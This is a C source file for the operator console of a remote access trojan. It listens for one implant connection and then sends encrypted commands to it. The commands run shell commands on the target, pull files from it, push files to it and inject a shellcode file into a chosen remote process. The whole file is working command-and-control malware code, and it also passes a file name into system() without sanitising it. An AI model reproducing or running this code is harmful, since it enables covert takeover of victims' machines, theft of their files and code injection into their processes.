#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <readline/readline.h>
#include <readline/history.h>

#include "common.h"
#include "server.h"
#include "encryption/crypt.h"

int g_flag_sigint = 0;

int main(void)
{
    SOCKET               server = -1, client = -1;
    char                 logbuf[260];
    struct sockaddr_in   serveraddr, clientaddr;
    socklen_t            clientlen;

    using_history();

    memset(logbuf, 0, sizeof(logbuf));
    memset(&serveraddr, 0, sizeof(serveraddr));
    memset(&clientaddr, 0, sizeof(clientaddr));

    serveraddr.sin_family = AF_INET;
    serveraddr.sin_addr.s_addr = inet_addr(SERVER_IP);
    serveraddr.sin_port = htons(SERVER_PORT);

    server = socket(AF_INET, SOCK_STREAM, 0);
    if (server < 0)
        goto out;

    if (bind(server, (struct sockaddr *)&serveraddr, sizeof(serveraddr)) < 0)
        goto out;

    if (listen(server, 1) < 0)
        goto out;

    p_status("[*] Server up and listening.\n");

    clientlen = (socklen_t)sizeof(clientaddr);
    client = accept(server, (struct sockaddr *)&clientaddr, &clientlen);
    if (client < 0)
        goto out;

    snprintf(logbuf, sizeof(logbuf), "[+] Incoming connection from %s.\n", inet_ntoa(clientaddr.sin_addr));
    p_success(logbuf);

    enter_cmd_loop(&client, &clientaddr);

out:
    // exit routine
    if (client >= 0)
        close(client);

    if (server >= 0)
        close(server);

    return 0;
}

void enter_cmd_loop(IN SOCKET *s, IN struct sockaddr_in *clientaddr)
{
    char            inputbuf[BUF_SZ / 2];
    char            cmd_func[MAX_SERV_CMD_FUNC_SZ + 1];
    char            prompt[BUF_SZ / 2];
    char            logbuf[260];
    const char      *cmd_func_start, *params;
    char            *input, c;
    int             i, cmd_func_sz, cmd_idx;

    if (signal(SIGINT, handle_signals) == SIG_ERR)
        p_err("[-] Registering signal handler failed. Pressing Ctrl-C will kill the shell!\n");

    serv_HELP(NULL, NULL);

    sprintf(prompt, "\033[0;34m%s:~$ \033[0m", inet_ntoa(clientaddr->sin_addr));

    while (1) {
        memset(inputbuf, 0, sizeof(inputbuf));
        memset(cmd_func, 0, sizeof(cmd_func));
        memset(logbuf, 0, sizeof(logbuf));

        cmd_func_start = NULL;
        params = NULL;
        input = NULL;
        c = 0;
        cmd_func_sz = -1;
        cmd_idx = -1;

        if (g_flag_sigint) {
            p_status("[*] Use !exit to properly terminate the shell!\n");
            g_flag_sigint = 0;
        }

        input = readline(prompt);
        if (!input)
            continue;

        for (i = 0; i < (sizeof(inputbuf) - 1); i++)
        {
            inputbuf[i] = input[i];
            if (input[i] == 0)
                break;
        }
        
        if (input) {
            free(input);
            input = NULL;
        }

        if (strlen(inputbuf) < 1)
            continue;

        add_history(inputbuf);

        if ((strlen(inputbuf) + 1) == sizeof(inputbuf)) {
            snprintf(logbuf, sizeof(logbuf), "[*] Input is capped at %ld characters, your input may be truncated.\n", (sizeof(inputbuf) - 1));
            p_status(logbuf);
        }

        cmd_func_start = inputbuf;
        while (*cmd_func_start == ' ')
            cmd_func_start++;

        if (*cmd_func_start == '!')
            for (i = 0; i < MAX_SERV_CMD_FUNC_SZ + 1; i++)
                if (*(cmd_func_start + i) == ' ' || *(cmd_func_start + i) == 0 ) {
                        cmd_func_sz = i;
                        break;
                }

        if (cmd_func_sz > 0) {
            strncat(cmd_func, cmd_func_start, cmd_func_sz);
            params = cmd_func_start + cmd_func_sz;
        } else {
            strcat(cmd_func, "!exec");
            params = inputbuf;
        }

        for (i = 0; i < SERV_MAX_CMDS; i++)
            if (strcmp(cmd_func, serv_cmd_funcs[i]) == 0) {
                cmd_idx = i;
                break;
            }
        
        if (cmd_idx < 0) {
            for (i = 0; i < SERV_MAX_CMDS; i++)
                if (strcmp("!exec", serv_cmd_funcs[i]) == 0) {
                    cmd_idx = i;
                    break;
                }
            params = inputbuf;
        }

        while (*params == ' ' || *params == '\n' || *params == '\r')
            params++;

        if (!serv_funcs[i](s, params))
            return;
    }
}

BOOL serv_EXEC(IN SOCKET *s, IN const char *params)
{
    char            cmd[BUF_SZ];
    char            res[BUF_SZ];

    if (!params || *params == 0)
        return TRUE;

    memset(cmd, 0, sizeof(cmd));

    strcat(cmd, "!exec ");
    strcat(cmd, params);
    sendbuf(*s, encrypt(cmd));

    do {
        memset(res, 0, sizeof(res));
        recvbuf(*s, res);
        decrypt(res);
        printf("%s", res);
    } while (strstr(res, STATUS_DONE) == NULL);

    return TRUE;
}

BOOL serv_GET(IN SOCKET *s, IN const char *params)
{
    char            cmd[BUF_SZ];
    char            res[BUF_SZ];
    char            cleanup[256];
    char            logbuf[260];
    char            *modparams = NULL, *local_filename = NULL;
    FILE            *fp = NULL;
    unsigned long   nwrite;

    if (!params || *params == 0) {
        p_err("[-] Missing arguments to !get, check !help\n");
        return TRUE;
    }

    memset(cmd, 0, sizeof(cmd));
    memset(res, 0, sizeof(res));
    memset(cleanup, 0, sizeof(cleanup));
    memset(logbuf, 0, sizeof(logbuf));
    modparams = (char *)params;

    strcat(cmd, "!get ");
    ntpath(modparams);
    strcat(cmd, params);

    unixpath(modparams);
    local_filename = last_unixpath(modparams);
    ntpath(modparams);

    fp = fopen(local_filename, "wb");
    if (!fp) {
        p_err("[-] Error writing file locally.\n");
        return TRUE;
    }

    sendbuf(*s, encrypt(cmd));
    recvbuf(*s, res);
    decrypt(res);

    if (strstr(res, STATUS_ERR) != NULL) {
        snprintf(logbuf, sizeof(logbuf), "[-] Error reading %s remotely.\n", params);
        p_err(logbuf);
        p_status("[*] Remember not to put quotes around file path!\n");
        if (fp)
            fclose(fp);
        snprintf(cleanup, sizeof(cleanup), "rm %s", local_filename);
        system(cleanup);
        return TRUE;
    }
    
    while (strstr(res, STATUS_END) == NULL) {
        fwrite(res, sizeof(char), sizeof(res), fp);
        memset(res, 0, sizeof(res));
        recvbuf(*s, res);
        decrypt(res);
    }

    recv(*s, &nwrite, 8, 0);
    nwrite = ntohl(nwrite);

    memset(res, 0, sizeof(res));

    recvbuf(*s, res);
    decrypt(res);
    fwrite(res, sizeof(char), nwrite, fp);

    if (fp)
        fclose(fp);
    p_success(STATUS_DONE);

    return TRUE;
}
BOOL serv_PUT(IN SOCKET *s, IN const char *params)
{
    char            cmd[BUF_SZ];
    char            res[BUF_SZ];
    char            status[BUF_SZ];
    char            logbuf[260];
    char            *modparams = NULL, *remote_filename = NULL;
    FILE            *fp = NULL;
    unsigned long   nread;

    if (!params || *params == 0) {
        p_err("[-] Missing arguments to !put, check !help\n");
        return TRUE;
    }

    memset(cmd, 0, sizeof(cmd));
    memset(res, 0, sizeof(res));
    memset(logbuf, 0, sizeof(logbuf));
    modparams = (char *)params;

    strcat(cmd, "!put ");
    unixpath(modparams);
    remote_filename = last_unixpath(modparams);
    strcat(cmd, remote_filename);

    fp = fopen(modparams, "rb");
    if (!fp) {
        snprintf(logbuf, sizeof(logbuf), "[-] Error reading %s locally.\n", modparams);
        p_err(logbuf);
        p_status("[*] Remember not to put quotes around file path!\n");
        return TRUE;
    }

    sendbuf(*s, encrypt(cmd));
    recvbuf(*s, res);
    decrypt(res);

    if (strstr(res, STATUS_ERR) != NULL) {
        p_err("[-] Error writing file remotely.\n");
        return TRUE;
    }

    memset(res, 0, sizeof(res));

    nread = fread(res, sizeof(char), sizeof(res), fp);
    while (nread == BUF_SZ) {
        sendbuf(*s, encrypt(res));
        memset(res, 0, sizeof(res));
        nread = fread(res, sizeof(char), sizeof(res), fp);
    }

    strcpy(status, STATUS_END);
    sendbuf(*s, encrypt(status));
    nread = htonl(nread);
    send(*s, (unsigned char *)&nread, 8, 0);
    sendbuf(*s, encrypt(res));

    if (fp)
        fclose(fp);
    p_success(STATUS_DONE);

    return TRUE;
}

BOOL serv_EXIT(IN SOCKET *s, IN const char *params)
{
    char    cmd[BUF_SZ];

    memset(cmd, 0, sizeof(cmd));

    strcat(cmd, "!exit ");
    strcat(cmd, params);

    p_status("[*] Exiting.\n");
    sendbuf(*s, encrypt(cmd));

    sleep(3);

    p_success(STATUS_DONE);

    return FALSE;
}

BOOL serv_INJECT(IN SOCKET *s, IN const char *params)
{
    char            cmd[BUF_SZ];
    char            res[BUF_SZ];
    char            status[BUF_SZ];
    char            logbuf[260];
    char            filepath[128];
    char            pid[8];
    const char      *pos;
    char            *tmp;
    FILE            *fp = NULL;
    unsigned long   ret, nread;

    if (!params || *params == 0) {
        p_err("[-] Missing arguments to !inject, check !help\n");
        return TRUE;
    }

    memset(cmd, 0, sizeof(cmd));
    memset(res, 0, sizeof(res));
    memset(filepath, 0, sizeof(filepath));
    memset(pid, 0, sizeof(pid));
    memset(logbuf, 0, sizeof(logbuf));
    
    pos = to_next_space(params);
    if (!pos) {
        p_err("[-] Malformed arguments to !inject, check !help\n");
        return TRUE;
    }

    strncpy(filepath, params, ((pos - params) > sizeof(filepath) ? sizeof(filepath) : (pos - params)));

    pos = to_next_non_space(pos);
    if (!pos) {
        p_err("[-] Malformed arguments to !inject, check !help\n");
        return TRUE;
    }

    strncpy(pid, pos, sizeof(pid));
    ret = strtoul(pid, &tmp, 10);
    if (ret == 0) {
        p_err("[-] Malformed arguments to !inject, check !help\n");
        p_err("[-] Also, injecting to process 0 won't work\n");
        return TRUE;
    }

    strcat(cmd, "!inject ");
    strcat(cmd, pid);

    fp = fopen(filepath, "rb");
    if (!fp) {
        snprintf(logbuf, sizeof(logbuf), "[-] Error reading %s locally.\n", filepath);
        p_err(logbuf);
        p_status("[*] Remember not to put quotes around file path!\n");
        return TRUE;
    }

    sendbuf(*s, encrypt(cmd));
    recvbuf(*s, res);
    decrypt(res);

    if (strstr(res, STATUS_ERR) != NULL) {
        memset(logbuf, 0, sizeof(logbuf));
        snprintf(logbuf, sizeof(logbuf), "[-] Error obtaining handle to process with PID %s.\n", pid);
        p_err(logbuf);
        return TRUE;
    }

    memset(res, 0, sizeof(res));

    nread = fread(res, sizeof(char), sizeof(res), fp);
    while (nread == BUF_SZ) {
        sendbuf(*s, encrypt(res));
        memset(res, 0, sizeof(res));
        nread = fread(res, sizeof(char), sizeof(res), fp);
    }

    strcpy(status, STATUS_END);
    sendbuf(*s, encrypt(status));
    nread = htonl(nread);
    send(*s, (unsigned char *)&nread, 8, 0);
    sendbuf(*s, encrypt(res));

    if (fp)
        fclose(fp);
    p_success(STATUS_DONE);

    return TRUE;
}

BOOL serv_LOCAL(IN SOCKET *s, IN const char *params)
{
    if (!params || *params == 0) {
        p_err("[-] Missing arguments to !local, check !help\n");
        return TRUE;
    }

    system(params);
    p_success(STATUS_DONE);
    return TRUE;
}

BOOL serv_HELP(IN SOCKET *s, IN const char *params)
{
    puts("\033[0;33m");
    puts("Core Functionalities:");
    puts("  -- default:                      !exec <command>");
    puts("  -- run shell commands on target: !exec <command>");
    puts("  -- download file:                !get <target filename>");
    puts("  -- upload file:                  !put <local filename>");
    puts("  -- inject shellcode:             !inject <local shellcode file> <remote process id>");
    puts("  -- exit shell:                   !exit");
    puts("  -- run shell commands locally:   !local <command>");
    puts("  -- view help:                    !help");
    puts("\033[0m");

    return TRUE;
}

void nolastslash(OUT char *s)
{
    if (s == NULL)
        return;

    if (*s == 0)
        return;

    if ((*s == '\\') && (s[1] == 0))
        return;

    while (s[1] != 0)
        s++;

    if (*s == '\\')
        *s = 0;
}

void ntpath(OUT char *s)
{
    while (*s != 0) {
        if (*s == '/')
            *s = '\\';
        s++;
    }
}

void unixpath(OUT char *s)
{
    while (*s != 0) {
        if (*s == '\\')
            *s = '/';
        s++;
    }
}

char *last_unixpath(IN char *s)
{
    char *pos;

    pos = s;
    while (*s != 0) {
        if (*s == '/' && *(s+1) != 0)
            pos = s+1;
        s++;
    }

    return pos;
}

const char *to_next_space(IN const char *s)
{
    const char *pos = NULL;

    while (*s != 0 && *s != ' ')
        s++;

    if (*s == ' ')
        pos = s;

    return pos;
}

const char *to_next_non_space(IN const char *s)
{
    const char *pos = NULL;

    while (*s != 0 && *s == ' ')
        s++;

    if (*s != 0)
        pos = s;

    return pos;
}

void p_err(const char *s)
{
    printf("\033[0;31m");
    printf("%s", s);
    printf("\033[0m");
}

void p_status(const char *s)
{
    printf("\033[0;33m");
    printf("%s", s);
    printf("\033[0m");
}

void p_success(const char *s)
{
    printf("\033[0;32m");
    printf("%s", s);
    printf("\033[0m");
}

void handle_signals(int signo)
{
    if (signo == SIGINT) {
        g_flag_sigint = 1;
        return;
    }
}